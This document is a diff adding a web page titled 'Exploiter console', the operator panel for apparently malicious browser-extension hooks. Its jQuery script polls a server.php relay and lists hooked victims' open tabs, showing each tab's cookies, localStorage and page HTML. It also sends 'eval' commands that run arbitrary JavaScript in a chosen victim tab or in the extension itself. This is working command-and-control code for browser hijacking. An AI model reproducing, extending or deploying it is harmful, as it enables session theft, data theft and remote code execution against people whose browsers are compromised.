@@ -1,0 +1,379 @@
+<html>
+<head>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+<script src="bootstrap/js/bootstrap.min.js"></script>
+<link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.min.css"/>
+<link href="bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet"/>
+<style>
+body {padding-top: 50px;}
+span,td,th {font-size: 11px; line-height: 14px;}
+#tabs-container {
+overflow-y: auto;
+}
+.currentTableRow td {
+background-color: #0088CC !important;
+color: #FFFFFF !important;
+}
+</style>
+<body>
+<div class="navbar navbar-fixed-top">
+    <div class="navbar-inner">
+        <div class="container">
+            <span class="brand">Exploiter console</span>
+        </div>
+    </div>
+</div>
+<div class="container">
+    <div class="row">
+        <div class="span2">
+            <div class="well" style="padding: 8px 0;">
+                <ul class="nav nav-list">
+                    <li class="nav-header">
+                    Hooks </li>
+                    <li class="active">
+                    <a href="#">#1</a>
+                    </li>
+                    <li>
+                    <a href="#">#2</a>
+                    </li>
+                </ul>
+            </div>
+            <button id=refresh-hook class='btn btn-secondary'>Refresh hook</button>
+            <button id=fix-server class='btn btn-secondary'>Fix server</button>
+
+        </div>
+        <div class="span10">
+            <div class="tabbable">
+                <ul class="nav nav-tabs">
+                    <li class="active"><a href="#tab-tabs" class='active' data-toggle="tab">Tabs</a></li>
+                    <li><a href="#tab-ext-info" data-toggle="tab">Extension info</a></li>
+                    <li><a href="#tab-ext-commands" data-toggle="tab">Commands</a></li>
+                </ul>
+                <div class="tab-content">
+                    <div class="tab-pane active" id="tab-tabs">
+                        <div class="row">
+                            <div class="span5" id="tabs-container">
+                                <table class="table-striped table table-condensed">
+                                <thead>
+                                <tr>
+                                    <th>
+                                        ID
+                                    </th>
+                                    <th>
+                                        Title
+                                    </th>
+                                </tr>
+                                <tr style=display:none id=tab-template>
+                                    <td data-fld=id>
+                                        1
+                                    </td>
+                                    <td class="url">
+                                        <a href=# target=_blank data-attr=href data-fld=url><i class="icon-share"></i></a>
+                                        <img data-fld=favIconUrl data-attr=src src="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABmJLR0T///////8JWPfcAAAACXBIWXMAAABIAAAASABGyWs+AAAAF0lEQVRIx2NgGAWjYBSMglEwCkbBSAcACBAAAeaR9cIAAAAASUVORK5CYII=" />
+                                        <span data-fld=title></span>
+                                    </td>
+                                    </tr>
+                
+                                </thead>
+                                <tbody id="hook-tabs">
+                                    </tbody>
+                                    </table>
+                                </div>
+                                <div class="span5">
+                                    <div class="tabbable">
+                                        <ul class="nav nav-tabs">
+                                            <li class="active"><a href="#tab-info" class='active' data-toggle="tab">Info</a></li>
+                                            <li><a href="#tab-commands" data-toggle="tab">Commands</a></li>
+                                            <li><a href="#tab-html" data-toggle="tab">HTML</a></li>
+                                        </ul>
+                                        <div class="tab-content">
+                                            <div class="tab-pane" id="tab-commands">
+                                                <form class="well" action="#">
+                                                    <label>Eval</label>
+                                                    <textarea class="span3" placeholder="alert(/place code to eval in this tab here/)"></textarea>
+                                                    <button id=eval type="button" class="btn btn-primary">Eval</button>
+                                                    <label>Result</label>
+                                                    <textarea class="span3" id=eval-result placeholder="result will be placed here."></textarea>
+                                                </form>
+                                            </div>
+                                            <div class="tab-pane" id="tab-html">
+                                                <textarea id=tab-current-html style="width: 100%; height: 300px">
+                                                </textarea>
+                                            </div>
+                                            <div class="tab-pane" id="tab-info">
+                                                <table class="table-striped table table-condensed">
+                                                <tbody>
+                                                <tr>
+                                                <th>URL</th><td data-fld=url></td>
+                                                </tr>
+                                                <tr>
+                                                <th>Cookies</th><td data-fld=cookies></td>
+                                                </tr>
+                                                <tr>
+                                                <th>localStorage</th><td><textarea style="width: 100%; height: 200px" data-fld=localStorage></textarea></td>
+                                                </tr>
+                                                <tr>
+                                                <th>HTML</th><td><textarea style="width: 100%; height:200px" data-fld=html></textarea></td>
+                                                </tr>
+                                                </tbody>
+                                                </table>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="tab-pane" id="tab-ext-info">
+                        <table class="table-striped table table-condensed">
+                        <tbody>
+                        <tr>
+                        <th>URL</th><td data-fld=extension></td>
+                        </tr>
+                        <tr>
+                        <th>Cookies</th><td data-fld=cookies></td>
+                        </tr>
+                        <tr>
+                        <th>localStorage</th><td><textarea style="width: 100%; height: 200px" data-fld=localStorage></textarea></td>
+                        </tr>
+                        <tr>
+                        <th>HTML</th><td><textarea style="width: 100%; height:200px" data-fld=html></textarea></td>
+                        </tr>
+
+                        </tbody>
+                        </table>
+                    
+                        </form>
+                        </div>
+                        <div class="tab-pane" id="tab-ext-commands">
+                            <p>
+                            <button id=ping class='btn btn-secondary'>Ping</button>                            
+                            </p>
+                            
+                            <form action="#">
+                                <label>Eval</label>
+                                <textarea class="span3" placeholder="alert(/place code to eval in extension/)"></textarea>
+                                <button type="button" id=eval-ext class="btn btn-primary">Eval</button>
+                                <label>Result</label>
+                                <textarea id=eval-ext-result class="span3" placeholder="result will be placed here."></textarea>
+                            </form>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="span12">
+                <form>
+                    <label>Log</label>
+                        <textarea id='log' style="width: 100%"></textarea>
+                    </div>
+                </div>
+            </div>
+<script>
+
+// current hook name
+var hook = 'xxx';
+var currentTab = null;
+
+var sendCmd = function(cmd, param, additional) {
+    var to_send = {cmd:cmd, p:param};
+    if (additional) {
+        to_send = $.extend(to_send, additional);
+    }
+    $.post('server.php?ch=' + encodeURIComponent(hook) + '-cmd', JSON.stringify(to_send));
+};
+
+function log(m) {
+       var text = (typeof m == 'string' ? m : JSON.stringify(m));
+        $("#log")[0].value += text + "\n";
+        $('#log')[0].scrollTop = 9999999;
+}
+
+function clickTab() {
+    loadTabData($(this).attr('data-tabid'));
+    currentTab = $(this).attr('data-tabid');
+    $('.currentTableRow').removeClass('currentTableRow');
+    $(this).closest('tr').addClass('currentTableRow');
+}
+
+var hookStorage = {
+    store: function(hook, key, value) {
+        if (!localStorage['hooks']) {
+            localStorage['hooks'] = JSON.stringify({});
+        }
+        
+        var hooks = JSON.parse(localStorage['hooks']);
+
+        if (!hooks[hook]) {
+            hooks[hook] = {}
+        }
+        
+        hooks[hook][key] = value;
+        localStorage['hooks'] = JSON.stringify(hooks);
+    },
+    
+    updateTab: function(hook, id, data) {
+        var tab = this.getTab(hook, id);
+        tab = $.extend(tab, data);
+        console.log(data);
+        this.setTab(hook, id, tab);
+    },
+    
+    getTabs: function(hook) {
+        return this.retrieve(hook, 'tabs', []);
+    },
+    
+    setTabs: function(hook, tabs) {
+        return this.store(hook, 'tabs', tabs);
+    },
+    
+    getTab: function(hook, id) {
+        var tabs = this.getTabs(hook);
+        for (var i = 0; i < tabs.length; i++) {
+            if (tabs[i].id == id) {
+                return tabs[i];
+            }
+        }
+        return {}
+    },
+    
+    setTab: function(hook, id, tab) {
+        var tabs = this.getTabs(hook);
+        for (var i = 0; i < tabs.length; i++) {
+            if (tabs[i].id == id) {
+                tabs[i] = tab;
+                this.setTabs(hook, tabs);
+                return;
+            }
+        }
+        tabs.push(tab);
+        this.setTabs(hook, tabs);
+        return;
+    },
+    
+    retrieve: function(hook, key, def) {
+        try {
+            return JSON.parse(localStorage['hooks'])[hook][key];
+        } catch (e) {
+            return def;
+        }
+    }
+};
+
+function fillDataTemplate(node, data) {
+        for (var j in data) {
+            var text = typeof data[j] == 'string' ? data[j] : JSON.stringify(data[j]);                    
+            $('[data-fld="' + j + '"]', node).each(function() {
+                if (this.attributes['data-attr']) {
+                    this[this.attributes['data-attr'].value] = text;
+                } else {
+                    if ($(this).is(':input')) {
+                        $(this).val(text);
+                    } else {
+                        $(this).text(text);
+                    }
+                }
+            });
+        }
+}
+
+function refreshTabsTable(t) {
+    $("#hook-tabs").html('');
+    for (var i = 0; i < t.length;  i++) {
+        var c = $('#tab-template').clone();
+        var tab = t[i];
+        c.attr('data-tabid', tab.id);
+        c.attr('id', '');
+        
+        fillDataTemplate(c, tab);
+        
+        c.click(clickTab);
+        c.appendTo('#hook-tabs').show();
+    }
+}
+
+function loadTabData(id) {
+    var tab = hookStorage.getTab(hook,id);
+    if (!tab) {
+        alert('no tab!');
+        return;
+    }
+    $("#tab-current-html").val(tab.html);
+    fillDataTemplate($('#tab-info'), tab);
+    
+}
+
+
+function processResponse(r, hook) {
+    if (typeof r == 'string' || !r.type) {
+        log(JSON.stringify(r));
+        console.log(r);
+        return;
+    }
+    switch (r.type) {
+        case 'recvstuff':
+            hookStorage.updateTab(hook, r.id, r.result);
+        break;
+        case 'recveval':
+            if (!r.id) {
+                $('#eval-ext-result').val(JSON.stringify(r.result));
+            } else {
+                $('#eval-result').val(JSON.stringify(r.result));
+            }
+        break;
+        case 'report_tabs':
+            hookStorage.setTabs(hook, r.result);
+            refreshTabsTable(hookStorage.getTabs(hook));
+        break;
+        case 'report_ext':
+            hookStorage.store(hook, 'info', r.result);
+            fillDataTemplate($('#tab-ext-info'), r.result);
+        break;
+        case 'pong':
+            log('pong ' + r.url);
+        break;
+    }
+}
+$(function() {
+    
+    $('#eval-ext').click(function() {
+        sendCmd('eval', $(this).prev().val());
+        $('#eval-ext-result').val('');
+    });
+
+    $('#eval').click(function() {
+        sendCmd('eval', $(this).prev().val(), {id: currentTab});
+        $('#eval-result').val('');
+    });    
+    $('#ping').click(function() {
+        sendCmd('ping');
+    });    
+    
+    $("#refresh-hook").click(function() {
+        refreshTabsTable([]);
+        sendCmd('report');
+    });
+    
+    $("#fix-server").click(function() {
+        $.get('server.php?delete=1&ch=' + encodeURIComponent(hook));
+        $.get('server.php?delete=1&ch=' + encodeURIComponent(hook) + '-cmd');
+    });
+    setInterval(function() {
+        $.getJSON('server.php?ch=' + encodeURIComponent(hook), function(json) {
+            for (var i=0; i < json.length; i++) {
+                processResponse(json[i][0],hook);
+            }
+        });
+    }, 2000);
+    
+    // start with saved data
+    refreshTabsTable(hookStorage.getTabs(hook));
+    fillDataTemplate($('#tab-ext-info'), hookStorage.retrieve(hook, 'info', {}));
+
+
+
+});
+</script>
+</body>
+</html>
